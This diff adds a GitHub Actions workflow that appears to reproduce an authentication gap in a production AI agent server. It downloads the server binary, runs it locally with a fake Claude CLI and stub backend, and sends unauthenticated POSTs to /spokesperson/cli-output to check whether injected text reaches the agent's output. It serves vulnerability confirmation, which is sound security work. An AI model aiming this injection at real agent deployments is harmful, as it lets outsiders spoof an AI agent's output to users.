@@ -1,0 +1,117 @@
+name: Box current prod spokesperson auth boundary
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Validate exact current production guest binary locally
+        shell: bash
+        run: |
+          set -euo pipefail
+          O=box-current-prod-spokesperson-boundary.txt
+          rm -rf /tmp/boxsp && mkdir -p /tmp/boxsp/work
+
+          git ls-remote --tags --refs https://github.com/ariana-dot-dev/agent-server.git \
+            | awk '{print $2}' | sed 's#refs/tags/##' \
+            | grep -E '^agent-server-v[0-9].*-ascii-prod[0-9]+$' | sort -V >/tmp/boxsp/tags
+          tag=$(tail -1 /tmp/boxsp/tags)
+          curl -fL "https://github.com/ariana-dot-dev/agent-server/releases/download/$tag/ascii-agents-server-linux-x64" -o /tmp/boxsp/agent
+          chmod +x /tmp/boxsp/agent
+
+          cat >/tmp/boxsp/fake-claude <<'SH'
+          #!/usr/bin/env bash
+          echo "ARGS:$*" >>/tmp/boxsp/fake-claude.log
+          if [[ " $* " == *" --version "* ]]; then echo '2.1.0'; exit 0; fi
+          cat >/tmp/boxsp/fake-claude.stdin 2>/dev/null & reader=$!
+          sleep 20
+          kill "$reader" 2>/dev/null || true
+          exit 0
+          SH
+          chmod +x /tmp/boxsp/fake-claude
+
+          cat >/tmp/boxsp/crypto.js <<'JS'
+          const c=require('crypto'); const [mode,secret,input]=process.argv.slice(2); const key=c.createHash('sha256').update(secret).digest();
+          if(mode==='enc'){const iv=c.randomBytes(16),x=c.createCipheriv('aes-256-gcm',key,iv),pt=JSON.stringify({authKey:secret,data:JSON.parse(input)}),ct=Buffer.concat([x.update(pt,'utf8'),x.final()]);process.stdout.write(Buffer.concat([iv,x.getAuthTag(),ct]).toString('base64'));}
+          else {const raw=Buffer.from(input,'base64'),iv=raw.subarray(0,16),tag=raw.subarray(16,32),ct=raw.subarray(32),d=c.createDecipheriv('aes-256-gcm',key,iv);d.setAuthTag(tag);process.stdout.write(Buffer.concat([d.update(ct),d.final()]).toString('utf8'));}
+          JS
+          enc(){ node /tmp/boxsp/crypto.js enc "$SHARED_KEY" "$1"; }
+          decfile(){ local f="$1"; jq -r '.encrypted // empty' "$f" | xargs -r -I{} node /tmp/boxsp/crypto.js dec "$SHARED_KEY" '{}'; }
+
+          cat >/tmp/boxsp/backend.py <<'PY'
+          from http.server import BaseHTTPRequestHandler,HTTPServer
+          import json
+          class H(BaseHTTPRequestHandler):
+            def do_GET(self):
+              out=b'{}'; self.send_response(200); self.send_header('content-type','application/json'); self.send_header('content-length',str(len(out))); self.end_headers(); self.wfile.write(out)
+            def do_POST(self):
+              n=int(self.headers.get('content-length','0') or 0); self.rfile.read(n)
+              out=json.dumps({'ok':True,'events':[]}).encode(); self.send_response(200); self.send_header('content-type','application/json'); self.send_header('content-length',str(len(out))); self.end_headers(); self.wfile.write(out)
+            def log_message(self,*a): pass
+          HTTPServer(('127.0.0.1',19097),H).serve_forever()
+          PY
+          python3 /tmp/boxsp/backend.py >/tmp/boxsp/backend.log 2>&1 & bpid=$!
+
+          export MACHINE_ID=box-spokesperson-local-test
+          export SHARED_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
+          export WORK_DIR=/tmp/boxsp/work HOME=/tmp/boxsp/work ASCII_PORT=18932 IS_SANDBOX=1
+          export BACKEND_URL=http://127.0.0.1:19097 BOX_CLI_API_URL=http://127.0.0.1:19097 ASCII_API_URL=http://127.0.0.1:19097 ASCII_TOKEN=LOCAL_TOKEN_MARKER
+          export CLAUDE_PATH=/tmp/boxsp/fake-claude NO_PROXY=127.0.0.1,localhost
+          /tmp/boxsp/agent >/tmp/boxsp/agent.log 2>&1 & apid=$!
+          cleanup(){ kill "$apid" "$bpid" 2>/dev/null || true; wait "$apid" "$bpid" 2>/dev/null || true; }; trap cleanup EXIT
+          for i in $(seq 1 100); do curl -sS --max-time 1 http://127.0.0.1:18932/health >/dev/null 2>&1 && break; sleep .2; done
+
+          { echo "AGENT_TAG=$tag"; echo "AGENT_SHA256=$(sha256sum /tmp/boxsp/agent|awk '{print $1}')"; } > "$O"
+
+          c=$(curl -sS --max-time 3 -o /tmp/boxsp/control -w '%{http_code}' -X POST http://127.0.0.1:18932/spokesperson/interrupt -H 'content-type: application/json' --data-binary '{"x":1}' || true)
+          echo "CONTROL_PROTECTED_SIBLING status=$c body=$(cat /tmp/boxsp/control)" >> "$O"
+
+          start_data='{"oneToken":"LOCAL_TOKEN_MARKER","agentType":"claude-code","productMode":"box","clearConversation":true,"modelsConfig":{"claude-code":{"default":"claude-sonnet-4-6","utility":"claude-sonnet-4-6","models":[{"id":"claude-sonnet-4-6","label":"Sonnet","sdkId":"claude-sonnet-4-6"}]}}}'
+          start_enc=$(enc "$start_data")
+          sc=$(curl -sS --max-time 30 -o /tmp/boxsp/start.json -w '%{http_code}' -X POST http://127.0.0.1:18932/start -H 'content-type: application/json' --data-binary "{\"encrypted\":\"$start_enc\"}" || true)
+          echo "START status=$sc decrypted=$(decfile /tmp/boxsp/start.json 2>/dev/null || cat /tmp/boxsp/start.json)" >> "$O"
+
+          group=boxsec-cycle
+          state='{"conversationId":"boxsec-cycle","messages":[],"pastConversations":[]}'
+          switch_data=$(jq -nc --arg g "$group" --argjson s "$state" '{incomingGroupId:$g,incomingState:$s,incomingProviderType:"claude-code"}')
+          switch_enc=$(enc "$switch_data")
+          sw=$(curl -sS --max-time 30 -o /tmp/boxsp/switch.json -w '%{http_code}' -X POST http://127.0.0.1:18932/spokesperson/switch-conversation -H 'content-type: application/json' --data-binary "{\"encrypted\":\"$switch_enc\"}" || true)
+          echo "SWITCH status=$sw decrypted=$(decfile /tmp/boxsp/switch.json 2>/dev/null || cat /tmp/boxsp/switch.json)" >> "$O"
+
+          cycle_data=$(jq -nc --arg g "$group" '{conversationGroupId:$g,cyclePrompt:"local validation only"}')
+          cycle_enc=$(enc "$cycle_data")
+          curl -sS --max-time 35 -o /tmp/boxsp/cycle.json -w '%{http_code}' -X POST http://127.0.0.1:18932/spokesperson/cycle -H 'content-type: application/json' --data-binary "{\"encrypted\":\"$cycle_enc\"}" >/tmp/boxsp/cycle.status & cpid=$!
+
+          accepted=0; code=none
+          for i in $(seq 1 250); do
+            : >/tmp/boxsp/inject.body
+            code=$(curl -sS --max-time 1 -o /tmp/boxsp/inject.body -w '%{http_code}' -X POST http://127.0.0.1:18932/spokesperson/cli-output -H 'content-type: application/json' --data-binary '{"kind":"say","content":"BOXSEC_UNAUTH_MARKER"}' 2>/dev/null || true)
+            if [ "$code" = 200 ]; then accepted=1; break; fi
+            sleep .05
+          done
+          echo "PLAIN_CALLBACK accepted=$accepted status=$code body=$(cat /tmp/boxsp/inject.body 2>/dev/null || true)" >> "$O"
+          wait "$cpid" || true
+          echo "CYCLE_HTTP=$(cat /tmp/boxsp/cycle.status 2>/dev/null || true)" >> "$O"
+          dec=$(decfile /tmp/boxsp/cycle.json 2>/dev/null || true)
+          echo "CYCLE_DECRYPTED=$dec" >> "$O"
+          if [ "$accepted" = 1 ] && printf '%s' "$dec" | grep -q 'BOXSEC_UNAUTH_MARKER'; then
+            echo 'UNAUTH_SPOKESPERSON_OUTPUT_INJECTION=CONFIRMED' >> "$O"
+          elif [ "$accepted" = 1 ]; then
+            echo 'UNAUTH_SPOKESPERSON_CALLBACK_ACCEPTED=CONFIRMED_OUTPUT_PROPAGATION=NOT_CONFIRMED' >> "$O"
+          else
+            echo 'UNAUTH_SPOKESPERSON_CALLBACK=NOT_CONFIRMED' >> "$O"
+          fi
+          echo '=== relevant agent log ===' >> "$O"
+          grep -Eai 'spokesperson|cycle|cli-output|Claude:|error|failed' /tmp/boxsp/agent.log | tail -n 300 >> "$O" || true
+          echo '=== fake claude ===' >> "$O"; cat /tmp/boxsp/fake-claude.log >> "$O" 2>/dev/null || true
+          cat "$O"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: box-current-prod-spokesperson-boundary
+          path: box-current-prod-spokesperson-boundary.txt
+          if-no-files-found: error
